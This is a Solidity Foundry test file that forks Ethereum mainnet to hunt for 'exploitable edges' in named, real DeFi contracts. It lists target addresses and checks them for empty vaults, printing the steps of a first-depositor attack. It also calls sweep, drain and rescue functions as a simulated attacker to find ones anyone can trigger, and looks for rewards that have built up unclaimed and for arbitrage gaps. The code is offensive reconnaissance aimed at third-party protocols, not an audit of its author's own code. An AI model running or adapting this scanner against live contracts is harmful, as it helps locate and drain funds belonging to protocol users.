// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Test.sol";
import "forge-std/console.sol";

/**
 * @title Novel Edge Finder
 * @notice Actually FIND exploitable edges through empirical testing
 * Not theory - test until we find something
 */
contract NovelEdgeFinder is Test {

    // Known tokens with special behavior
    address constant STETH = 0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84;
    address constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7; // Fee-capable
    address constant PAXG = 0x45804880De22913dAFE09f4980848ECE6EcbAf78; // Fee token

    // Target contracts from contracts.txt
    address constant SABLIER = 0xa4fc358455febe425536fd1878be67ffdbdec59a;
    address constant CURVE_GAUGE = 0xc5cfada84e902ad92dd40194f0883ad49639b023;
    address constant CETHER = 0x7b4a7fd41c688a7cb116534e341e44126ef5a0fd;
    address constant EARLY_ADOPTER = 0x7623e9DC0DA6FF821ddb9EbABA794054E078f8c4;

    function setUp() public {
        vm.createSelectFork("https://eth-mainnet.g.alchemy.com/v2/demo");
    }

    // ============================================================
    // EDGE 1: Find contracts with stuck rebasing tokens
    // ============================================================

    /**
     * @notice Check if any contract has more stETH than accounted
     * Due to rebasing, contracts can accumulate "dust" over time
     */
    function test_findStuckStETH() public {
        console.log("========== STUCK stETH FINDER ==========");
        console.log("");

        address[] memory targets = new address[](10);
        targets[0] = SABLIER;
        targets[1] = EARLY_ADOPTER;
        targets[2] = 0x16de59092dae5ccf4a1e6439d611fd0653f0bd01; // yDAI
        targets[3] = 0x7fcb7dac61ee35b3d4a51117a7c58d53f0a8a670; // Compound-style
        targets[4] = 0x4f6a43ad7cba042606decaca730d4ce0a57ac62e; // Saddle
        targets[5] = 0xE5f24791E273Cb96A1f8E5B67Bc2397F0AD9B8B4; // DolaSavings
        targets[6] = 0x996913c8c08472f584ab8834e925b06D0eb1D813; // RewardVault
        targets[7] = 0x82bA8da44Cd5261762e629dd5c605b17715727bd; // FraxQueue
        targets[8] = 0x9A0C8Ff858d273f57072D714bca7411D717501D7; // st1INCH
        targets[9] = 0x10e6593cdda8c58a1d0f14c5164b376352a55f2f; // DAI Bridge

        for (uint i = 0; i < targets.length; i++) {
            _checkStETHBalance(targets[i]);
        }

        console.log("");
        console.log("========================================");
    }

    function _checkStETHBalance(address target) internal view {
        (bool s, bytes memory d) = STETH.staticcall(
            abi.encodeWithSignature("balanceOf(address)", target)
        );
        if (s && d.length >= 32) {
            uint256 bal = abi.decode(d, (uint256));
            if (bal > 0) {
                console.log("Contract:", target);
                console.log("  stETH balance:", bal / 1e18, "stETH");
                console.log("  !!! May have stuck rebasing tokens");
            }
        }
    }

    // ============================================================
    // EDGE 2: Find veCRV holders with expired locks (kickable)
    // ============================================================

    /**
     * @notice Find gauge stakers whose veCRV expired
     * They can be kicked to reduce their boost
     */
    function test_findKickableUsers() public {
        console.log("========== KICKABLE USER FINDER ==========");
        console.log("");

        // Get voting escrow from gauge
        (bool s, bytes memory d) = CURVE_GAUGE.staticcall(
            abi.encodeWithSignature("voting_escrow()")
        );
        if (!s) {
            console.log("Could not get voting escrow");
            return;
        }

        address ve = abi.decode(d, (address));
        console.log("Voting Escrow:", ve);

        // We would need to iterate through gauge depositors
        // and check their veCRV lock end times
        console.log("");
        console.log("To find kickable users:");
        console.log("1. Get list of gauge stakers (from events)");
        console.log("2. For each: check locked.end in veCRV");
        console.log("3. If locked.end < now: user is kickable");
        console.log("4. Kicking them redistributes rewards");

        // Check if gauge supports kick
        (s,) = CURVE_GAUGE.staticcall(abi.encodeWithSignature("kick(address)", address(0)));
        // Will revert, but we're just checking if function exists

        console.log("");
        console.log("==========================================");
    }

    // ============================================================
    // EDGE 3: Find empty vaults vulnerable to first-depositor
    // ============================================================

    /**
     * @notice Find any vault with totalSupply = 0
     */
    function test_findEmptyVaults() public {
        console.log("========== EMPTY VAULT FINDER ==========");
        console.log("");

        address[] memory vaults = new address[](15);
        vaults[0] = 0x16de59092dae5ccf4a1e6439d611fd0653f0bd01; // yDAI
        vaults[1] = 0x7b4a7fd41c688a7cb116534e341e44126ef5a0fd; // cETH
        vaults[2] = 0x4f6a43ad7cba042606decaca730d4ce0a57ac62e; // Saddle
        vaults[3] = 0xface851a4921ce59e912d19329929ce6da6eb0c7; // cLINK
        vaults[4] = 0xE5f24791E273Cb96A1f8E5B67Bc2397F0AD9B8B4; // DolaSavings
        vaults[5] = 0xc5cfada84e902ad92dd40194f0883ad49639b023; // Curve Gauge
        vaults[6] = 0x5f465e9fcffc217c5849906216581a657cd60605; // Convex Chef
        vaults[7] = 0x93054188d876f558f4a66b2ef1d97d16edf0895b; // Curve renBTC
        vaults[8] = 0xb1f2cdec61db658f091671f5f199635aef202cac; // Curve Gauge 2
        vaults[9] = 0x4e840aadd28da189b9906674b4afcb77c128d9ea; // anySPELL
        vaults[10] = 0xa61beb4a3d02decb01039e378237032b351125b4;
        vaults[11] = 0xab73ec65a1ef5a2e5b56d5d6f36bee4b2a1d3ffb;
        vaults[12] = 0xf74bf048138a2b8f825eccabed9e02e481a0f6c0;
        vaults[13] = 0x0f30c808069315b3b7dfbfe149c87448b50c6d8b;
        vaults[14] = 0xf35a92585ceee7251388e14f268d9065f5206207;

        uint256 emptyCount = 0;

        for (uint i = 0; i < vaults.length; i++) {
            bool isEmpty = _checkIfEmpty(vaults[i]);
            if (isEmpty) {
                emptyCount++;
                console.log("!!! EMPTY VAULT FOUND:", vaults[i]);
            }
        }

        console.log("");
        console.log("Empty vaults found:", emptyCount);

        if (emptyCount > 0) {
            console.log("");
            console.log("POTENTIAL FIRST-DEPOSITOR ATTACK:");
            console.log("1. Deposit 1 wei -> get 1 share");
            console.log("2. Donate tokens to vault");
            console.log("3. Victim deposits -> gets 0 shares");
            console.log("4. Withdraw all");
        }

        console.log("");
        console.log("=========================================");
    }

    function _checkIfEmpty(address vault) internal view returns (bool) {
        (bool s, bytes memory d) = vault.staticcall(
            abi.encodeWithSignature("totalSupply()")
        );
        if (s && d.length >= 32) {
            uint256 supply = abi.decode(d, (uint256));
            return supply == 0;
        }
        return false;
    }

    // ============================================================
    // EDGE 4: Find contracts with permissionless fund recovery
    // ============================================================

    /**
     * @notice Check for unprotected sweep/recover functions
     */
    function test_findPermissionlessSweep() public {
        console.log("========== PERMISSIONLESS SWEEP FINDER ==========");
        console.log("");

        address[] memory targets = new address[](10);
        targets[0] = SABLIER;
        targets[1] = EARLY_ADOPTER;
        targets[2] = 0x7623e9DC0DA6FF821ddb9EbABA794054E078f8c4;
        targets[3] = 0x996913c8c08472f584ab8834e925b06D0eb1D813;
        targets[4] = 0xE5f24791E273Cb96A1f8E5B67Bc2397F0AD9B8B4;
        targets[5] = 0x82bA8da44Cd5261762e629dd5c605b17715727bd;
        targets[6] = 0x9A0C8Ff858d273f57072D714bca7411D717501D7;
        targets[7] = 0xa4fc358455febe425536fd1878be67ffdbdec59a;
        targets[8] = 0x1f98407aab862cddef78ed252d6f557aa5b0f00d;
        targets[9] = 0x4f2bc163c8758d7f88771496f7b0afde767045f3;

        // Common sweep function selectors
        bytes4[] memory sweepFuncs = new bytes4[](8);
        sweepFuncs[0] = bytes4(keccak256("sweep(address)"));
        sweepFuncs[1] = bytes4(keccak256("rescueTokens(address,uint256)"));
        sweepFuncs[2] = bytes4(keccak256("recoverERC20(address,uint256)"));
        sweepFuncs[3] = bytes4(keccak256("withdrawStuckTokens(address)"));
        sweepFuncs[4] = bytes4(keccak256("emergencyWithdraw()"));
        sweepFuncs[5] = bytes4(keccak256("drain()"));
        sweepFuncs[6] = bytes4(keccak256("collect()"));
        sweepFuncs[7] = bytes4(keccak256("skim(address)"));

        address attacker = makeAddr("attacker");

        for (uint i = 0; i < targets.length; i++) {
            address target = targets[i];

            for (uint j = 0; j < sweepFuncs.length; j++) {
                vm.prank(attacker);
                (bool success,) = target.call(
                    abi.encodeWithSelector(sweepFuncs[j], attacker)
                );
                if (success) {
                    console.log("!!! SUCCESS on", target);
                    console.log("    Function:", uint32(sweepFuncs[j]));
                }
            }
        }

        console.log("");
        console.log("================================================");
    }

    // ============================================================
    // EDGE 5: Find timing-sensitive operations
    // ============================================================

    /**
     * @notice Check for block.timestamp dependencies that can be manipulated
     */
    function test_findTimingVulnerabilities() public {
        console.log("========== TIMING VULNERABILITY FINDER ==========");
        console.log("");

        // Warp time forward and see what changes
        uint256 originalTime = block.timestamp;

        console.log("Original timestamp:", originalTime);

        // Check DolaSavings reward accumulation
        address dolaSavings = 0xE5f24791E273Cb96A1f8E5B67Bc2397F0AD9B8B4;

        (bool s, bytes memory d) = dolaSavings.staticcall(
            abi.encodeWithSignature("lastUpdate()")
        );
        if (s && d.length >= 32) {
            uint256 lastUpdate = abi.decode(d, (uint256));
            uint256 timeSince = originalTime - lastUpdate;
            console.log("DolaSavings last update:", lastUpdate);
            console.log("Time since update:", timeSince, "seconds");

            if (timeSince > 3600) {
                console.log("!!! REWARDS ACCUMULATED - first staker captures!");
            }
        }

        // Warp forward 1 day
        vm.warp(originalTime + 86400);

        console.log("");
        console.log("After warping 1 day forward:");

        // Check what changed
        (s, d) = dolaSavings.staticcall(
            abi.encodeWithSignature("lastUpdate()")
        );
        if (s && d.length >= 32) {
            uint256 lastUpdate = abi.decode(d, (uint256));
            uint256 timeSince = block.timestamp - lastUpdate;
            console.log("Time since update now:", timeSince, "seconds");
        }

        console.log("");
        console.log("================================================");
    }

    // ============================================================
    // EDGE 6: Find cross-contract arbitrage opportunities
    // ============================================================

    /**
     * @notice Check for price discrepancies across DEXes
     */
    function test_findArbitrageOpportunities() public {
        console.log("========== ARBITRAGE FINDER ==========");
        console.log("");

        // Check Curve pool prices vs external
        address curveRenBTC = 0x93054188d876f558f4a66b2ef1d97d16edf0895b;

        // Get virtual price
        (bool s, bytes memory d) = curveRenBTC.staticcall(
            abi.encodeWithSignature("get_virtual_price()")
        );
        if (s && d.length >= 32) {
            uint256 vp = abi.decode(d, (uint256));
            console.log("Curve renBTC virtual_price:", vp);
        }

        // Get dy for swap
        (s, d) = curveRenBTC.staticcall(
            abi.encodeWithSignature("get_dy(int128,int128,uint256)", 0, 1, 1e8)
        );
        if (s && d.length >= 32) {
            uint256 dy = abi.decode(d, (uint256));
            console.log("Swap 1 renBTC -> WBTC:", dy);
            console.log("Rate:", dy * 100 / 1e8, "% of input");

            // If rate significantly != 100%, there's arb opportunity
            if (dy < 99e6 || dy > 101e6) {
                console.log("!!! POTENTIAL ARBITRAGE - rate deviation!");
            }
        }

        console.log("");
        console.log("=======================================");
    }

    // ============================================================
    // COMPREHENSIVE SCAN - RUN ALL
    // ============================================================

    function test_runAllScans() public {
        console.log("########################################");
        console.log("#     COMPREHENSIVE EDGE SCAN          #");
        console.log("########################################");
        console.log("");

        // Run all the scans
        test_findStuckStETH();
        test_findEmptyVaults();
        test_findTimingVulnerabilities();
        test_findArbitrageOpportunities();
    }
}
